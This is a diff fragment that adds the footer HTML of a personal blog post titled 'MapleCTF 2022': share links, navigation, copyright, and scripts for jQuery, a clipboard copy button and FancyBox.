+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&title=MapleCTF 2022"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&title=MapleCTF 2022"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&title=MapleCTF 2022"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&title=MapleCTF 2022"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&name=MapleCTF 2022&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&t=MapleCTF 2022"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    Thomason Zhao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ThomasonZhao">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<!-- FancyBox -->
+
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+</body>
+</html>
